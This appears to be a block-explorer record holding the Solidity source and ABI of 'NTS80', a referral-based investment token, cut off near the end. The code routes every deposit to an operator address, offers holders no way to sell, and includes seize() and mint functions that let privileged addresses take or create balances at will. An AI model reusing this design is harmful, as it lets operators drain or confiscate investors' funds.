{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.5.11;\r\n\r\n\r\ninterface ICustomersFundable {\r\n    function fundCustomer(address customerAddress, uint8 subconto) external payable;\r\n}\r\n\r\ninterface IRemoteWallet {\r\n    function invest(address customerAddress, address target, uint256 value, uint8 subconto) external returns (bool);\r\n}\r\n\r\ninterface IFundable {\r\n    function fund() external payable;\r\n}\r\n\r\ncontract NTS80 is IFundable {\r\n    modifier onlyBagholders {\r\n        require(myTokens() > 0);\r\n        _;\r\n    }\r\n\r\n    modifier onlyAdmin {\r\n        require(msg.sender == admin);\r\n        _;\r\n    }\r\n\r\n    modifier onlyBoss2 {\r\n        require(msg.sender == boss2);\r\n        _;\r\n    }\r\n    \r\n    modifier onlyBoss3 {\r\n        require(msg.sender == boss3);\r\n        _;\r\n    }\r\n\r\n    string public name = \"NTS 80\";\r\n    string public symbol = \"NTS80\";\r\n    uint8 constant public decimals = 18;\r\n    address public admin;\r\n    address constant internal boss1 = 0xCa27fF938C760391E76b7aDa887288caF9BF6Ada;\r\n    address constant internal boss2 = 0xf43414ABb5a05c3037910506571e4333E16a4bf4;\r\n    address public boss3 = 0xf4632894bF968467091Dec1373CC1Bf5d15ef6B1;\r\n    \r\n    uint8 public refLevel1_ = 9;\r\n    uint8 public refLevel2_ = 3;\r\n    uint8 public refLevel3_ = 2;\r\n    uint256 constant internal tokenPrice = 0.001 ether;\r\n    uint256 public minimalInvestment = 2.5 ether;\r\n    uint256 public stakingRequirement = 0;\r\n    \r\n    mapping(address => uint256) internal tokenBalanceLedger_;\r\n    mapping(address => uint256) public referralBalance_;\r\n    mapping(address => uint256) public repayBalance_;\r\n    mapping(address => bool) public mayPassRepay;\r\n\r\n    uint256 internal tokenSupply_;\r\n    bool public saleOpen = true;\r\n    \r\n    address private refBase = address(0x0);\r\n\r\n    constructor() public {\r\n        admin = msg.sender;\r\n        mayPassRepay[boss1] = true;\r\n        mayPassRepay[boss2] = true;\r\n        mayPassRepay[boss3] = true;\r\n    }\r\n\r\n    function buy(address _ref1, address _ref2, address _ref3) public payable returns (uint256) {\r\n        require(msg.value >= minimalInvestment, \"Value is below minimal investment.\");\r\n        require(saleOpen, \"Sales stopped for the moment.\");\r\n        return purchaseTokens(msg.value, _ref1, _ref2, _ref3);\r\n    }\r\n\r\n    function() external payable {\r\n        require(msg.value >= minimalInvestment, \"Value is below minimal investment.\");\r\n        require(saleOpen, \"Sales stopped for the moment.\");\r\n        purchaseTokens(msg.value, address(0x0), address(0x0), address(0x0));\r\n    }\r\n\r\n    function reinvest() public {\r\n        address _customerAddress = msg.sender;\r\n        uint256 value = referralBalance_[_customerAddress];\r\n        require(value > 0);\r\n        \r\n        referralBalance_[_customerAddress] = 0;\r\n        uint256 _tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));\r\n        emit OnReinvestment(_customerAddress, value, _tokens, false, now);\r\n    }\r\n    \r\n    function remoteReinvest(uint256 value) public {\r\n        if (IRemoteWallet(refBase).invest(msg.sender, address(this), value, 4)) {\r\n            uint256 tokens = purchaseTokens(value, address(0x0), address(0x0), address(0x0));\r\n            emit OnReinvestment(msg.sender, value, tokens, true, now);\r\n        }\r\n    }\r\n    \r\n    function fund() public payable {\r\n        emit OnFund(msg.sender, msg.value, now);\r\n    }\r\n\r\n    function exit() public {\r\n        address _customerAddress = msg.sender;\r\n        uint256 balance = repayBalance_[_customerAddress];\r\n        if (balance > 0) getRepay();\r\n        withdraw();\r\n    }\r\n\r\n    function withdraw() public {\r\n        address payable _customerAddress = msg.sender;\r\n        uint256 value = referralBalance_[_customerAddress];\r\n        require(value > 0);\r\n        referralBalance_[_customerAddress] = 0;\r\n        _customerAddress.transfer(value);\r\n        emit OnWithdraw(_customerAddress, value, now);\r\n    }\r\n\r\n    function getRepay() public {\r\n        address payable _customerAddress = msg.sender;\r\n        uint256 balance = repayBalance_[_customerAddress];\r\n        require(balance > 0);\r\n        repayBalance_[_customerAddress] = 0;\r\n        uint256 tokens = tokenBalanceLedger_[_customerAddress];\r\n        tokenBalanceLedger_[_customerAddress] = 0;\r\n        tokenSupply_ = tokenSupply_ - tokens;\r\n\r\n        _customerAddress.transfer(balance);\r\n        emit OnGotRepay(_customerAddress, balance, now);\r\n    }\r\n\r\n    function myTokens() public view returns (uint256) {\r\n        address _customerAddress = msg.sender;\r\n        return balanceOf(_customerAddress);\r\n    }\r\n\r\n    function balanceOf(address _customerAddress) public view returns (uint256) {\r\n        return tokenBalanceLedger_[_customerAddress];\r\n    }\r\n\r\n    function purchaseTokens(uint256 _incomingEthereum, address _ref1, address _ref2, address _ref3) internal returns (uint256) {\r\n        address _customerAddress = msg.sender;\r\n        uint8 welcomeFee_ = refLevel1_ + refLevel2_ + refLevel3_;\r\n        require(welcomeFee_ <= 99);\r\n\r\n        uint256[7] memory uIntValues = [\r\n            _incomingEthereum * welcomeFee_ / 100,\r\n            0,\r\n            0,\r\n            0,\r\n            0,\r\n            0,\r\n            0\r\n        ];\r\n\r\n        uIntValues[1] = uIntValues[0] * refLevel1_ / welcomeFee_;\r\n        uIntValues[2] = uIntValues[0] * refLevel2_ / welcomeFee_;\r\n        uIntValues[3] = uIntValues[0] * refLevel3_ / welcomeFee_;\r\n\r\n        uint256 _taxedEthereum = _incomingEthereum - uIntValues[0];\r\n\r\n        uint256 _amountOfTokens = ethereumToTokens_(_incomingEthereum);\r\n        //uint256 _fee = _dividends * magnitude;\r\n\r\n        require(_amountOfTokens > 0);\r\n\r\n        if (\r\n            _ref1 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref1] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            if (refBase == address(0x0)) {\r\n                referralBalance_[_ref1] += uIntValues[1];\r\n            } else {\r\n                ICustomersFundable(refBase).fundCustomer.value(uIntValues[1])(_ref1, 1);\r\n                uIntValues[4] = uIntValues[1]; \r\n            }\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[1];\r\n            _ref1 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        if (\r\n            _ref2 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref2] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            if (refBase == address(0x0)) {\r\n                referralBalance_[_ref2] += uIntValues[2];\r\n            } else {\r\n                ICustomersFundable(refBase).fundCustomer.value(uIntValues[2])(_ref2, 2);\r\n                uIntValues[5] = uIntValues[2];\r\n            }\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[2];\r\n            _ref2 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        if (\r\n            _ref3 != 0x0000000000000000000000000000000000000000 &&\r\n            tokenBalanceLedger_[_ref3] * tokenPrice >= stakingRequirement\r\n        ) {\r\n            if (refBase == address(0x0)) {\r\n                referralBalance_[_ref3] += uIntValues[3];\r\n            } else {\r\n                ICustomersFundable(refBase).fundCustomer.value(uIntValues[3])(_ref3, 3);\r\n                uIntValues[6] = uIntValues[3];\r\n            }\r\n        } else {\r\n            referralBalance_[boss1] += uIntValues[3];\r\n            _ref3 = 0x0000000000000000000000000000000000000000;\r\n        }\r\n\r\n        referralBalance_[boss2] += _taxedEthereum;\r\n\r\n        tokenSupply_ += _amountOfTokens;\r\n        \r\n        tokenBalanceLedger_[_customerAddress] += _amountOfTokens;\r\n\r\n        emit OnTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _ref1, _ref2, _ref3, uIntValues[4], uIntValues[5], uIntValues[6], now);\r\n\r\n        return _amountOfTokens;\r\n    }\r\n\r\n    function ethereumToTokens_(uint256 _ethereum) public pure returns (uint256) {\r\n        uint256 _tokensReceived = _ethereum * 1e18 / tokenPrice;\r\n\r\n        return _tokensReceived;\r\n    }\r\n\r\n    function tokensToEthereum_(uint256 _tokens) public pure returns (uint256) {\r\n        uint256 _etherReceived = _tokens / tokenPrice * 1e18;\r\n\r\n        return _etherReceived;\r\n    }\r\n\r\n    /* Admin methods */\r\n    function mint(address customerAddress, uint256 value) public onlyBoss3 {\r\n        tokenSupply_ += value;\r\n        tokenBalanceLedger_[customerAddress] += value;\r\n        \r\n        emit OnMint(customerAddress, value, now);\r\n    }\r\n    \r\n    function setRefBonus(uint8 level1, uint8 level2, uint8 level3, uint256 minInvest, uint256 staking) public {\r\n        require(msg.sender == boss3 || msg.sender == admin);\r\n        refLevel1_ = level1;\r\n        refLevel2_ = level2;\r\n        refLevel3_ = level3;\r\n        \r\n        minimalInvestment = minInvest;\r\n        stakingRequirement = staking;\r\n        \r\n        emit OnRefBonusSet(level1, level2, level3, minInvest, staking, now);\r\n    }\r\n    \r\n    function passRepay(address customerAddress) public payable {\r\n        require(mayPassRepay[msg.sender], \"Not allowed to pass repay from your address.\");\r\n        uint256 value = msg.value;\r\n        require(value > 0);\r\n\r\n        repayBalance_[customerAddress] += value;\r\n        emit OnRepayPassed(customerAddress, msg.sender, value, now);\r\n    }\r\n\r\n    function allowPassRepay(address payer) public onlyAdmin {\r\n        mayPassRepay[payer] = true;\r\n        emit OnRepayAddressAdded(payer, now);\r\n    }\r\n\r\n    function denyPassRepay(address payer) public onlyAdmin {\r\n        mayPassRepay[payer] = false;\r\n        emit OnRepayAddressRemoved(payer, now);\r\n    }\r\n\r\n    function passInterest(address customerAddress, uint256 ethRate, uint256 rate) public payable {\r\n        require(mayPassRepay[msg.sender], \"Not allowed to pass interest from your address.\");\r\n        require(msg.value > 0);\r\n        \r\n        if (refBase == address(0x0)) {\r\n            referralBalance_[customerAddress] += msg.value;\r\n        } else {\r\n            ICustomersFundable(refBase).fundCustomer.value(msg.value)(msg.sender, 5);\r\n        }\r\n\r\n        emit OnInterestPassed(customerAddress, msg.value, ethRate, rate, now);\r\n    }\r\n\r\n    function saleStop() public onlyAdmin {\r\n        saleOpen = false;\r\n        emit OnSaleStop(now);\r\n    }\r\n\r\n    function saleStart() public onlyAdmin {\r\n        saleOpen = true;\r\n        emit OnSaleStart(now);\r\n    }\r\n\r\n    function deposeBoss3(address x) public onlyAdmin {\r\n        emit OnBoss3Deposed(boss3, x, now);\r\n        boss3 = x;\r\n    }\r\n    \r\n    function setRefBase(address x) public onlyAdmin {\r\n        emit OnRefBaseSet(refBase, x, now);\r\n        refBase = x;\r\n    }\r\n    \r\n    function seize(address customerAddress, address receiver) public {\r\n        require(msg.sender == boss1 || msg.sender == boss2);\r\n \r\n        uint256 tokens = tokenBalanceLedger_[customerAddress];\r\n        if (tokens > 0) {\r\n            tokenBalanceLedger_[customerAddress] = 0;\r\n            tokenBalanceLedger_[receiver] += tokens;\r\n        }\r\n        \r\n        uint256 value = referralBalance_[customerAddress];\r\n        if (value > 0) {\r\n            referralBalance_[customerAddress] = 0;\r\n            referralBalance_[receiver] += value;\r\n        }\r\n        \r\n        uint256 repay = repayBalance_[customerAddress];\r\n        if (repay > 0) {\r\n            repayBalance_[customerAddress] = 0;\r\n            referralBalance_[receiver] += repay;\r\n        }\r\n        \r\n        emit OnSeize(customerAddress, receiver, tokens, value, repay, now);\r\n    }\r\n\r\n    event OnTokenPurchase(\r\n        address indexed customerAddress,\r\n        uint256 incomingEthereum,\r\n        uint256 tokensMinted,\r\n        address ref1,\r\n        address ref2,\r\n        address ref3,\r\n        uint256 ref1value,\r\n        uint256 ref2value,\r\n        uint256 ref3value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnReinvestment(\r\n        address indexed customerAddress,\r\n        uint256 ethereumReinvested,\r\n        uint256 tokensMinted,\r\n        bool isRemote,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnWithdraw(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnGotRepay(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayPassed(\r\n        address indexed customerAddress,\r\n        address indexed payer,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnInterestPassed(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 ethRate,\r\n        uint256 rate,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnSaleStop(\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnSaleStart(\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayAddressAdded(\r\n        address indexed payer,\r\n        uint256 timestamp\r\n    );\r\n\r\n    event OnRepayAddressRemoved(\r\n        address indexed payer,\r\n        uint256 timestamp\r\n    );\r\n    \r\n    event OnMint(\r\n        address indexed customerAddress,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n    \r\n    event OnBoss3Deposed(\r\n        address indexed former,\r\n        address indexed current,\r\n        uint256 timestamp  \r\n    );\r\n    \r\n    event OnRefBonusSet(\r\n        uint8 level1,\r\n        uint8 level2,\r\n        uint8 level3,\r\n        uint256 minimalInvestment,\r\n        uint256 stakingRequirement,\r\n        uint256 timestamp\r\n    );\r\n    \r\n    event OnRefBaseSet(\r\n        address indexed former,\r\n        address indexed current,\r\n        uint256 timestamp\r\n    );\r\n    \r\n    event OnSeize(\r\n        address indexed customerAddress,\r\n        address indexed receiver,\r\n        uint256 tokens,\r\n        uint256 value,\r\n        uint256 repayValue,\r\n        uint256 timestamp\r\n    );\r\n    \r\n    event OnFund(\r\n        address indexed source,\r\n        uint256 value,\r\n        uint256 timestamp\r\n    );\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"payer\",\"type\":\"address\"}],\"name\":\"allowPassRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"x\",\"type\":\"address\"}],\"name\":\"deposeBoss3\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"x\",\"type\":\"address\"}],\"name\":\"setRefBase\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level1\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"level2\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"level3\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"minInvest\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"staking\",\"type\":\"uint256\"}],\"name\":\"setRefBonus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"minimalInvestment\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"refLevel3_\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_ethereum\",\"type\":\"uint256\"}],\"name\":\"ethereumToTokens_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ethRate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"passInterest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"mint\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"mayPassRepay\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"stakingRequirement\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"repayBalance_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_customerAddress\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"refLevel2_\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"boss3\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"saleStop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"remoteReinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"myTokens\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_ref1\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_ref2\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_ref3\",\"type\":\"address\"}],\"name\":\"buy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"saleOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"}],\"name\":\"passRepay\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"saleStart\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"fund\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"refLevel1_\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tokens\",\"type\":\"uint256\"}],\"name\":\"tokensToEthereum_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"referralBalance_\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"payer\",\"type\":\"address\"}],\"name\":\"denyPassRepay\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"exit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"seize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reinvest\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"incomingEthereum\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"ref1\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"ref2\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"ref3\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ref1value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ref2value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ref3value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnTokenPurchase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethereumReinvested\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensMinted\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isRemote\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnReinvestment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnWithdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnGotRepay\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayPassed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethRate\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnInterestPassed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnSaleStop\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnSaleStart\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayAddressAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"payer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRepayAddressRemoved\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnMint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"former\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"current\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnBoss3Deposed\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level1\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level2\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level3\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"minimalInvestment\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"stakingRequirement\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRefBonusSet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"former\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"current\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnRefBaseSet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"customerAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"repayValue\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnSeize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"source\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"OnFund\",\"type\":\"event\"}]","ContractName":"NTS80","CompilerVersion":"v0.5.11+commit.c082d0b4","OptimizationUsed":"1","Runs":"200","ConstructorArgu